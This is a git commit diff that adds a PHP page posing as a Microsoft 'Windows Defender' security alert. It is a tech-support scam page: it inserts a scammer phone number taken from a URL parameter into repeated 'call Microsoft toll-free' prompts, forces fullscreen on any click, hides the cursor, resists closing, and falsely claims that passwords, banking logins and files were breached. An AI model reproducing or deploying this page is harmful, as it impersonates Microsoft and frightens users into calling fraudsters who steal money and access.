5b900a3b8b25e3936edf40a12e45e6710d2d759f
vinodgupta812121212 <112196842+vinodgupta812121212@users.noreply.github.com>
2023-12-15 08:00:34 +0530

    1

---
+++ wxxx/0wa0rni0ng0/index.php
@@ -0,0 +1,182 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
+          integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="main.css">
+    <title>Security Center</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+    <script>
+        function dsasfsdcscnsmndqweqwe(name)
+        {
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( window.location.href );
+            if( results == null )
+                return "";
+            else
+                return results[1];
+        }
+        var phone = dsasfsdcscnsmndqweqwe('phone');
+    </script>
+
+    <script type="text/javascript">
+        window.onload = function () {
+            document.onclick = function (e) {
+                e = e || event;
+                target = e.target || e.srcElement;
+                if (target.tagName === "DIV") {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                } else {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                }
+            }
+        }
+    </script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-GM2G4YY18G"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GM2G4YY18G');
+</script>
+
+
+</head>
+<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
+
+<div class="bg" style="cursor:none;">
+    <div class="bgimg" style="top: 0px;"><img src="bg2.jpg" alt="" width="100%"/></div>
+
+</div>
+<a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
+    <div class="black" style="height: 145%;cursor: none;"></div>
+</a>
+
+<div id="footer" style="top: 672px; position: absolute;cursor: none;">
+    <div class="row">
+
+        <div class="col-md-12">
+            <div class="right-foot" style="text-align: center;">
+                <span id="footertxt"><img src="microsoft.png"> Call Microsoft Security Centre: </span><span
+                        style="font-weight: 700;padding-left: 13px;color: #fff;">(Toll-Free)<span
+                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone)</script> </span> </span>
+            </div>
+        </div>
+        <div class="col-md-12">
+            <marquee width="100%" direction="left" height="100px"><small class="text-left"
+                                                                         style="color: #eee;font-size: 10px;">Windows Secure Services prevented an unrecognized IP Application from stating. Running this IP application might put your PC
+                    at risk. Windows Defender Scan has found potentially unwanted Threat on this device that can steal
+                    your passwords, online identity, financial information, personal Information, pictures or
+                    documents.</small></marquee>
+        </div>
+    </div>
+
+
+</div>
+
+<div id="yteuwqtudggsajdgjahs" class="lightbox">
+    <div class="ilb top">
+        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span>Security Services</span>
+            <span id="txts1" class="fl title2 close"><a href="#"><img src="cross.png"></a></span>
+
+        </div>
+    </div>
+    <div id="txtintro">
+                <span class="colo-rd">App: Ads.fiancetrack(2).dll<br>
+                Threat Detected:  Trojan Spyware</span>
+    </div>
+    <img id="banner" src="virus-images.jpg">
+    <div id="disclaimer">
+        Access has been blocked for security reasons and for Safety.<br>
+        <span class="support">Call Windows Security Toll Free: <script>document.write(phone)</script> </span>
+    </div>
+    <div id="bottom">
+        <img id="badge" src="microsoft.png"><span class="title3">Microsoft</span>
+        <ul>
+            <li>
+                <a href="#">
+                    <div class="fr button2">
+                        <span id="addtochromebutton">Cancel</span>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="#">
+                    <div class="fr button">
+                        <span id="addtochromebutton">Scan</span>
+                    </div>
+                </a>
+            </li>
+        </ul>
+
+    </div>
+</div>
+
+<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
+    <p class="text-center" style="    font-size: 16px;
+    font-weight: normal;
+    margin: 0;
+    margin-bottom: 5px;
+    padding: 5px 10px;
+    color: #FFFFFF !important;
+    color: #414141;font-weight: bold;
+    margin-top: 8px;">MS WINDOWS DEFENDER - Warning Alert System</p>
+    <p>** ACCESS HAS BEEN BLOCKED FOR SECURITY REASONS AND FOR THE SAFETY **</p>
+    <p>Your System has alerted us that it has been infected with Spyware Issues. The following data has been
+        Breached.</p>
+    <p>&gt; Email Passwords<br>
+        &gt; Banking Passwords<br>
+        &gt; Facebook Login<br>
+        &gt; Photos &amp; Files
+    </p>
+    <p>Windows Security Feature has found potentially unwanted Adware on this device that can Breach your passwords, online
+        identity, financial information, files, Personal pictures or documents.</p>
+    <p>You must Call us immediately so that our System engineers can walk you through the removal process over the
+        Phone.</p>
+    <p>Contact MS Windows Toll-Free immediately to report this threat, prevent identity theft and unlock access to this
+        device.</p>
+    <p>Closing this Page will put your personal information at risk and lead to a suspension of your Windows
+        Registration Private Key.</p>
+    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Contact Microsoft (Toll-Free) Number: <strong>
+            <script>document.write(phone)</script> </strong></p>
+    <div class="action_buttons"><a class="active" id="leave_page"
+                                   style="cursor: pointer; color: #FFFFFF !important;">Allow</a> <a class="active"
+                                                                                                 id="leave_page"
+                                                                                                 style="color: #FFFFFF !important;">Deny</a>
+    </div>
+</div>
+<div id="welcomeDiv"
+     style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  "
+     class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">You must Call us immediately so that our System engineers can walk you through the removal process over the
+        phone.<br>Your Computer is disabled. <br><br> </p>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
+        crossorigin="anonymous"></script>
+<script type="text/javascript" src="fullscreen.js"></script>
+<script type="text/javascript" src="before.js"></script>
+<script type="text/javascript" src="main.js"></script>
+<script type="text/javascript" src="light.js"></script>
+<script type="text/javascript" src="jscode.js"></script>
+
+</body>
+
+</html>
